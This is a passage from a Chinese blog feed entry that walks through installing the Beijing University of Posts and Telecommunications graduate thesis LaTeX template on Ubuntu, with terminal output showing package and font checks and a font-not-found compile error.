      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[在Ubuntu Linux下使用北邮毕业论文LaTeX模板]]></title>
    <link href="http://reverland.org/linux/2015/11/29/using-buptgraduatethesis-on-ubuntu/"/>
    <id>http://reverland.org/linux/2015/11/29/using-buptgraduatethesis-on-ubuntu/</id>
    <published>2015-11-29T14:50:01.000Z</published>
    <updated>2015-11-29T16:26:12.988Z</updated>
    <content type="html"><![CDATA[<h1 id="Using_BUPTGraduateThesis_on_Ubuntu_14-10">Using BUPTGraduateThesis on Ubuntu 14.10</h1><p><strong>警告： 这是非官方模板，一切可能的格式问题都可能导致学位论文不被接受。欢迎选择HARD模式，and enjoy it!</strong></p>
<h2 id="序言">序言</h2><p>作为一个对office不熟练而tex较为熟悉的人，排版和公式在word下实在不会玩。得益于<a href="https://github.com/rioxwang/BUPTGraduateThesis" target="_blank" rel="external">BUPTGraduateThesis项目</a>，希望终能离开<a href="https://onedrive.live.com" target="_blank" rel="external">Word Online</a>码论文的苦海。其实更像，我最终选择了HARD模式和未知。</p>
<p>感谢张煜博士（Dazzle Zhang）、王贤凌博士（rioxwang）和之前所有为清华、北邮毕业论文模板做过奉献的先驱们，感谢XeCJK和CTEX的开发人员。在此致敬。</p>
<h2 id="On_Ubuntu_14-10">On Ubuntu 14.10</h2><h3 id="下载和查看帮助">下载和查看帮助</h3><p>克隆项目(如你所见，需要git)：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">28</span>:<span class="number">43</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;&gt; git <span class="built_in">clone</span> https://gitcafe.com/rioxwang/BUPTGraduateThesis.git</span><br><span class="line">Cloning into <span class="string">'BUPTGraduateThesis'</span>...</span><br><span class="line">remote: Counting objects: <span class="number">164</span>, done.</span><br><span class="line">remote: Total <span class="number">164</span> (delta <span class="number">0</span>), reused <span class="number">0</span> (delta <span class="number">0</span>)</span><br><span class="line">Receiving objects: <span class="number">100</span>% (<span class="number">164</span>/<span class="number">164</span>), <span class="number">6.54</span> MiB | <span class="number">1.00</span> MiB/s, done.</span><br><span class="line">Resolving deltas: <span class="number">100</span>% (<span class="number">67</span>/<span class="number">67</span>), done.</span><br><span class="line">Checking connectivity... done.</span><br></pre></td></tr></table></figure>
<p>进入目录查看下有哪些文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">29</span>:<span class="number">25</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;&gt; <span class="built_in">cd</span> BUPTGraduateThesis</span><br><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">29</span>:<span class="number">48</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08) &gt; ls</span><br><span class="line">buptgraduatethesis.pdf  logo        makethesis.bat  release.zip</span><br><span class="line">install                 makethesis  README.md</span><br></pre></td></tr></table></figure>
<p> <strong>切记第一件事</strong> ，查看<code>README.md</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">11</span>:<span class="number">04</span>:<span class="number">44</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; cat README.md</span><br><span class="line">Version</span><br><span class="line">==================</span><br><span class="line">当前版本v6.<span class="number">2</span>，同时托管于GitHub与GitCafe，支持Windows、Linux和OSX平台。该版本可以在项目主页直接下载ZIP压缩包获得，也可以通过如下任意一条git命令选择一个网速较快的服务器获得：</span><br><span class="line"></span><br><span class="line">    git <span class="built_in">clone</span> https://gitcafe.com/rioxwang/BUPTGraduateThesis.git</span><br><span class="line">    git <span class="built_in">clone</span> https://github.com/rioxwang/BUPTGraduateThesis.git</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">About</span><br><span class="line">==================</span><br><span class="line">BUPTGraduateThesis提供北京邮电大学研究生学位论文LaTeX文档类，其符合北邮研究生院<span class="number">2014</span>年<span class="number">11</span>月发布的《关于研究生学位论文格式的统一要求》。目前已经可以生成除了封面之外的所有论文内容，封面由于书脊的存在，需要进一步细调。我们建议利用BUPTGraduateThesis生成除了封面之外的所有PDF内容，再使用WORD生成封面。（注：扉页可以正常输出，而封面是打印时需要打印在指定彩纸上的内容，与扉页相比多了书脊这部分内容，需要根据论文薄厚做细调。校内的打印店均可以帮忙依据PDF的扉页生成封面。）</span><br><span class="line"></span><br><span class="line">该项目源于张煜博士（Dazzle Zhang）发起并维护的BUPTThesis项目，并由王贤凌博士（rioxwang）在其基础上增添了更加稳健的中文处理方案，于<span class="number">2013</span>年<span class="number">7</span>月<span class="number">5</span>日发布。该项目借助XeTeX引擎，利用xeCJK宏包取代BUPTThesis中的CJK宏包作为中文解决方案。同时，BUPTGraduateThesis根据研究生院发布的最新要求，对学位论文格式进行微调，并且提供更为详细的用户帮助文档buptgraduatethesis.pdf。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Quick Help</span><br><span class="line">==================</span><br><span class="line">快速安装说明</span><br><span class="line"></span><br><span class="line">更具体的安装说明与帮助文档请参见buptgraduatethesis.pdf。</span><br><span class="line"></span><br><span class="line">为了方便新手入门，BUPTGraduateThesis提供了基于Docstrip的安装方式和免安装压缩包release.zip，用户可以依照自己的习惯选择，两者方式差别不大。使用免安装压缩包的用户，只需要将release.zip解压，并将所有文件拷贝到主目录下即可正常使用（注意备份已有工作！）。</span><br><span class="line"></span><br><span class="line">为了生成用户帮助文档buptgraduatethesis.pdf，安装前请保证Adobe系列中文字体已经安装。</span><br><span class="line"></span><br><span class="line">Adobe系列字体用于提供免费的常用中文字体：</span><br><span class="line"></span><br><span class="line">*  AdobeFangsongStd-Regular.otf</span><br><span class="line">*  AdobeHeitiStd-Regular.otf</span><br><span class="line">*  AdobeKaitiStd-Regular.otf</span><br><span class="line">*  AdobeSongStd-Light.otf</span><br><span class="line"></span><br><span class="line">Windows用户请打开CMD，输入如下命令进行安装：</span><br><span class="line"></span><br><span class="line">    makethesis.bat install</span><br><span class="line"></span><br><span class="line">Linux/OSX用户请打开SHELL输入如下命令进行安装：</span><br><span class="line"></span><br><span class="line">    chmod a+x makethesis</span><br><span class="line">    ./makethesis install</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Change Logs</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">*  v6.<span class="number">2</span>：<span class="number">2015</span>/<span class="number">04</span>/<span class="number">23</span>，修正参考文献列表序号不对齐的BUG（v6.<span class="number">1</span>用户升级请在cls文件中搜索multibib宏包，删除其resetlabels选项的调用，在各个ch_xxx.tex和pubs.tex调用参考文献数据库之前使用\setcounter&#123;NAT@ctr&#125;&#123;<span class="number">0</span>&#125;</span><br><span class="line">重置参考文献计数器）</span><br><span class="line">*  v6.<span class="number">1</span>：<span class="number">2015</span>/<span class="number">01</span>/<span class="number">16</span>，修正发表论文列表中序号不对齐的BUG</span><br><span class="line">*  v6.<span class="number">0</span>：<span class="number">2014</span>/<span class="number">01</span>/<span class="number">02</span>，重新整理buptgraduatethesis.bst；在bare_thesis.bib中给出各类参考文献模板；更新帮助文档；迁移到GitCafe</span><br><span class="line">*  v5.<span class="number">4</span>：<span class="number">2014</span>/<span class="number">11</span>/<span class="number">29</span>，根据新版论文格式要求修正学位论文类参考文献的格式</span><br><span class="line">*  v5.<span class="number">3</span>：<span class="number">2014</span>/<span class="number">11</span>/<span class="number">22</span>，修正buptgraduatethesis.bst中学位论文类参考文献格式的BUG</span><br><span class="line">*  v5.<span class="number">2</span>：<span class="number">2014</span>/<span class="number">07</span>/<span class="number">17</span>，根据新版论文格式对文档类进行精简；修正封面的BUG；修正最新版xeCJK带来的问题；更新帮助文档</span><br><span class="line">*  v5.<span class="number">1</span>：<span class="number">2014</span>/<span class="number">05</span>/<span class="number">31</span>，修正makethesis中分章参考文献编译的BUG，此BUG会影响Linux和Unix用户的分章参考文献输出</span><br><span class="line">*  v5.<span class="number">0</span>：<span class="number">2014</span>/<span class="number">04</span>/<span class="number">14</span>，增添数学字体选项，可以使用Computer Modern字体；盲审版本将隐去致谢和独创性等声明页；根据新版硕、博士论文格式要求更新模板和封面；修改参考文献中英文姓名出现Jr时的排版，并添加说明；修改帮助文档的字体，不用再依赖TeX Gyre Pagella字体；修正图名和表名的字体；改进一系列参考文献排版规则；增加免安装版，解压即可用；去除makethesis中安装时的输出重定向，方便排错</span><br><span class="line">*  v4.<span class="number">0</span>：<span class="number">2013</span>/<span class="number">12</span>/<span class="number">26</span>，根据xeCJK宏包的更新修改宏包加载项；修复由于伪粗体带来的复制粘贴的BUG</span><br><span class="line">*  v3.<span class="number">0</span>：<span class="number">2013</span>/<span class="number">12</span>/<span class="number">23</span>，根据新版论文格式要求更新模板</span><br><span class="line">*  v2.<span class="number">3</span>：<span class="number">2013</span>/<span class="number">11</span>/<span class="number">29</span>，修改bibtex生成的参考文献中URL的字体</span><br><span class="line">*  v2.<span class="number">2</span>：<span class="number">2013</span>/<span class="number">11</span>/<span class="number">29</span>，修正缩略语在第一次引用时无法出现中文释义的 BUG</span><br><span class="line">*  v2.<span class="number">1</span>：<span class="number">2013</span>/<span class="number">11</span>/<span class="number">21</span>，修改article类型参考文献显示样式</span><br><span class="line">*  v2.<span class="number">0</span>：<span class="number">2013</span>/<span class="number">11</span>/<span class="number">20</span>，增加部分参考文献自定义配置的功能；更新帮助文档</span><br><span class="line">*  v1.<span class="number">3</span>：<span class="number">2013</span>/<span class="number">11</span>/<span class="number">15</span>，修正makethesis.bat的BUG；将Unicode指令替换为char指令用于引入Unicode字符；使用xeCJKsetcharclass命令修正xetex引擎下的带圈数字脚注</span><br><span class="line">*  v1.<span class="number">2</span>：<span class="number">2013</span>/<span class="number">11</span>/<span class="number">14</span>，修正makethesis.bat的BUG</span><br><span class="line">*  v1.<span class="number">1</span>：<span class="number">2013</span>/<span class="number">07</span>/<span class="number">30</span>，更新makethesis的换行模式</span><br><span class="line">*  v1.<span class="number">0</span>：<span class="number">2013</span>/<span class="number">07</span>/<span class="number">08</span>，初始版本</span><br><span class="line"></span><br><span class="line">To Do List</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">*  整理文档类的代码，增添注释，便于更多人一起学习LaTeX</span><br><span class="line">*  在书签中输出章节编号</span><br><span class="line">*  改进文档参考文献输入规范与IEEE参考文献输入规范的兼容性%</span><br></pre></td></tr></table></figure>
<p>README写得非常清晰，请 <strong>一定</strong> 认真参照<code>README</code>和<code>buptgraduatethesis.pdf</code>中的指示。我只简要记录下ubuntu下需要注意哪些问题，Linux用户可以参照我的记录。</p>
<h3 id="安装依赖包和字体">安装依赖包和字体</h3><p>先列出模板必要的依赖，首先是texlive中ubuntu哪些包。当然，如果也可以直接安装<code>texlive-full</code>，省心但这将耗费1.4G的空间。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">29</span>:<span class="number">49</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08) &gt; dpkg --get-selections |grep texlive</span><br><span class="line">texlive-base					install</span><br><span class="line">texlive-bibtex-extra				install</span><br><span class="line">texlive-binaries				install</span><br><span class="line">texlive-extra-utils				install</span><br><span class="line">texlive-font-utils				install</span><br><span class="line">texlive-fonts-recommended			install</span><br><span class="line">texlive-fonts-recommended-doc			install</span><br><span class="line">texlive-generic-recommended			install</span><br><span class="line">texlive-lang-cjk				install</span><br><span class="line">texlive-lang-other				install</span><br><span class="line">texlive-latex-base				install</span><br><span class="line">texlive-latex-base-doc				install</span><br><span class="line">texlive-latex-extra				install</span><br><span class="line">texlive-latex-extra-doc				install</span><br><span class="line">texlive-latex-recommended			install</span><br><span class="line">texlive-latex-recommended-doc			install</span><br><span class="line">texlive-luatex					install</span><br><span class="line">texlive-pictures				install</span><br><span class="line">texlive-pictures-doc				install</span><br><span class="line">texlive-pstricks				install</span><br><span class="line">texlive-pstricks-doc				install</span><br><span class="line">texlive-science					install</span><br><span class="line">texlive-science-doc				install</span><br><span class="line">texlive-xetex					install</span><br></pre></td></tr></table></figure>
<p>必要的字体，由于版权原因需要从网络上下载（Adobe系列字体）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">31</span>:<span class="number">55</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; <span class="built_in">fc</span>-list|grep Adobe</span><br><span class="line">/home/reverland/.fonts/a/AdobeKaitiStd-Regular.otf: Adobe Kaiti Std,Adobe 楷体 Std,Adobe Kaiti Std R,Adobe 楷体 Std R:style=R,Regular</span><br><span class="line">/home/reverland/.fonts/a/AdobeHeitiStd_Regular_(v5.<span class="number">010</span>).otf: Adobe Heiti Std,Adobe 黑体 Std,Adobe Heiti Std R,Adobe 黑体 Std R:style=R,Regular</span><br><span class="line">/home/reverland/.fonts/a/AdobeFangsongStd-Regular.otf: Adobe Fangsong Std,Adobe 仿宋 Std,Adobe Fangsong Std R,Adobe 仿宋 Std R:style=R,Regular</span><br><span class="line">/home/reverland/.fonts/a/AdobeSongStd-Light.otf: Adobe Song Std,Adobe 宋体 Std,Adobe Song Std L,Adobe 宋体 Std L:style=L,Regular</span><br></pre></td></tr></table></figure>
<p>微软Windows操作系统提供的中易字体：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─[<span class="number">0</span>] &lt;&gt; <span class="built_in">fc</span>-list|grep sim</span><br><span class="line">/home/reverland/.fonts/s/simsun.ttc: SimSun,宋体:style=Regular</span><br><span class="line">/home/reverland/.fonts/s/simfang.ttf: FangSong_GB2312,仿宋_GB2312:style=Regular</span><br><span class="line">/home/reverland/.fonts/s/simkai.ttf: KaiTi_GB2312,楷体_GB2312:style=Regular</span><br><span class="line">/home/reverland/.fonts/s/simhei.ttf: SimHei,黑体:style=Regular</span><br></pre></td></tr></table></figure>
<p>ubuntu软件仓库提供的微软核心英文字体，包括<code>Times New</code>系列。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">53</span>:<span class="number">40</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; dpkg --get-selections |grep mscore</span><br><span class="line">ttf-mscorefonts-installer			install</span><br></pre></td></tr></table></figure>
<p>新安装字体后别忘了更新系统字体缓存：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">33</span>:<span class="number">10</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; <span class="built_in">fc</span>-cache -fv</span><br></pre></td></tr></table></figure>
<h3 id="生成示例文件">生成示例文件</h3><p>使用如下命令生成示例文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">30</span>:<span class="number">47</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; ./makethesis install</span><br><span class="line">mkdir: cannot create directory ‘example’: File exists</span><br><span class="line">Extracting and installing files...</span><br><span class="line">This is XeTeX, Version <span class="number">3.1415926</span>-<span class="number">2.5</span>-<span class="number">0.9999</span>.<span class="number">3</span> (TeX Live <span class="number">2013</span>/Debian)</span><br><span class="line"> restricted \write18 enabled.</span><br><span class="line">entering extended mode</span><br><span class="line">(./install/buptgraduatethesis.ins</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/l3kernel/l3docstrip.tex</span><br><span class="line">(/usr/share/texlive/texmf-dist/tex/latex/base/docstrip.tex</span><br><span class="line">Utility: `docstrip<span class="string">' 2.5d &lt;2005/07/29&gt;</span><br><span class="line">English documentation    &lt;1999/03/31&gt;</span><br><span class="line">...</span><br><span class="line">Underfull \hbox (badness 10000) detected at line 765</span><br><span class="line">[]\EU1/lmtt/m/n/10 \fs []</span><br><span class="line">[9] [10]</span><br><span class="line"></span><br><span class="line">LaTeX Warning: `!h'</span> <span class="built_in">float</span> specifier changed to `!ht<span class="string">'.</span><br><span class="line"></span><br><span class="line">[11] [12]) [13] (./buptgraduatethesis.gls) [14] (./buptgraduatethesis.aux)</span><br><span class="line"></span><br><span class="line">LaTeX Font Warning: Some font shapes were not available, defaults substituted.</span><br><span class="line"></span><br><span class="line"> )</span><br><span class="line">(see the transcript file for additional information)</span><br><span class="line">Output written on buptgraduatethesis.pdf (14 pages).</span><br><span class="line">Transcript written on buptgraduatethesis.log.</span><br><span class="line">Clearing TMP files...</span><br><span class="line">===========================================</span><br><span class="line">= Mission Done!</span><br><span class="line">= BUPTGraduateThesis is successfully installed!</span><br><span class="line">===========================================</span></span><br></pre></td></tr></table></figure>
<p>会在当前目录生成 <code>buptgraduatethesis.cls</code> 、 <code>buptgraduatethesis.cfg</code>、<code>buptgraduatethe-
sis.bst</code> 以及 <code>example</code> 文件夹。</p>
<p><strong>注意</strong>: 你看到<code>Mission Done</code>并不一定真的成功生成文件了，可能中途发生些找不到字体的错误并只生成了部分文件，请仔细检查生成文件是否正常</p>
<p>检查<code>example</code>文件夹。该文件夹包含了一个示例，可以用来检查安装是否正常。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; ls example</span><br><span class="line">ackgmt.tex         bare_thesis.bib  ch_intro.tex   pubs.bib</span><br><span class="line">acronyms.tex       bare_thesis.tex  metadata.tex   pubs.tex</span><br><span class="line">app_lhospital.tex  ch_concln.tex    notations.tex</span><br></pre></td></tr></table></figure>
<p>按<code>buptgraduatethesis.pdf</code>建议将<code>example</code>中文件拷贝到当前目录，并检查确认。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">34</span>:<span class="number">11</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; cp example/* .</span><br><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">35</span>:<span class="number">50</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; ls</span><br><span class="line">ackgmt.tex              buptgraduatethesis.cfg  example         notations.tex</span><br><span class="line">acronyms.tex            buptgraduatethesis.cls  install         pubs.bib</span><br><span class="line">app_lhospital.tex       buptgraduatethesis.log  logo            pubs.tex</span><br><span class="line">bare_thesis.bib         buptgraduatethesis.pdf  makethesis      README.md</span><br><span class="line">bare_thesis.tex         ch_concln.tex           makethesis.bat  release.zip</span><br><span class="line">buptgraduatethesis.bst  ch_intro.tex            metadata.tex    xeCJK-fonts.def</span><br></pre></td></tr></table></figure>
<p>确认无误后测试生成论文。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads/BUPTGraduateThesis] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">36</span>:<span class="number">37</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;git:(master cfb5f08✱✈) &gt; ./makethesis thesis</span><br><span class="line">===========================================</span><br><span class="line">=</span><br><span class="line">= TARGET=bare_thesis</span><br><span class="line">= MAINMATTERS=ch_intro ch_concln</span><br><span class="line">= DRIVER=xetex</span><br><span class="line">= BIBTYPE=chapbib</span><br><span class="line">=</span><br><span class="line">===========================================</span><br><span class="line">Double check above configurations! Press anykey to <span class="built_in">continue</span>, CTRL+C to stop!</span><br></pre></td></tr></table></figure>
<p>按任意键继续</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(/usr/share/texlive/texmf-dist/tex/xelatex/xecjk/config/xeCJK.cfg))</span><br><span class="line">(/usr/share/texmf/tex/latex/CJK/CJKnumb.sty) (./xeCJK-fonts.def</span><br><span class="line">kpathsea: Running mktextfm KaiTi/ICU</span><br><span class="line">/usr/share/texlive/texmf-dist/web2c/mktexnam: Could not map <span class="built_in">source</span> abbreviation I <span class="keyword">for</span> ICU.</span><br><span class="line">/usr/share/texlive/texmf-dist/web2c/mktexnam: Need to update /usr/share/texlive/texmf-dist/fonts/map/fontname/special.map?</span><br><span class="line">mktextfm: Running mf-nowin -progname=mf \mode:=ljfour; mag:=<span class="number">1</span>; nonstopmode; input ICU</span><br><span class="line">This is METAFONT, Version <span class="number">2.718281</span> (TeX Live <span class="number">2013</span>/Debian)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kpathsea: Running mktexmf ICU</span><br><span class="line">! I can<span class="string">'t find file `ICU'</span>.</span><br><span class="line">&lt;*&gt; \mode:=ljfour; mag:=<span class="number">1</span>; nonstopmode; input ICU</span><br><span class="line"></span><br><span class="line">Please <span class="built_in">type</span> another input file name</span><br><span class="line">! Emergency stop.</span><br><span class="line">&lt;*&gt; \mode:=ljfour; mag:=<span class="number">1</span>; nonstopmode; input ICU</span><br><span class="line"></span><br><span class="line">Transcript written on mfput.log.</span><br><span class="line">grep: ICU.log: No such file or directory</span><br><span class="line">mktextfm: `mf-nowin -progname=mf \mode:=ljfour; mag:=<span class="number">1</span>; nonstopmode; input ICU<span class="string">' failed to make ICU.tfm.</span><br><span class="line">kpathsea: Appending font creation commands to missfont.log.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span><br><span class="line">!</span><br><span class="line">! fontspec error: "font-not-found"</span><br><span class="line">!</span><br><span class="line">! The font "KaiTi" cannot be found.</span><br><span class="line">!</span><br><span class="line">! See the fontspec documentation for further information.</span><br><span class="line">!</span><br><span class="line">! For immediate help type H &lt;return&gt;.</span><br><span class="line">!...............................................</span><br><span class="line"></span><br><span class="line">l.14 ...Font=&#123;SimHei&#125;, ItalicFont=&#123;KaiTi&#125;]&#123;SimSun&#125;</span><br><span class="line"></span><br><span class="line">?</span></span><br></pre></td></tr></table></figure>
<p>喜大普奔，找不到字体。根据提示，检查系统安装的字体名字。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌─[reverland@reverland-R478-R429] - [~/Downloads] - [<span class="number">2015</span>-<span class="number">11</span>-<span class="number">29</span> <span class="number">10</span>:<span class="number">57</span>:<span class="number">01</span>]</span><br><span class="line">└─[<span class="number">0</span>] &lt;&gt; <span class="built_in">fc</span>-list|grep KaiTi</span><br><span class="line">/home/reverland/.fonts/s/simkai.ttf: KaiTi_GB2312,楷体_GB2312:style=Regular</span><br></pre></td></tr></table></figure>
<p>根据<code>buptgraduatethesis.pdf</code>说明更改字体设定。</p>
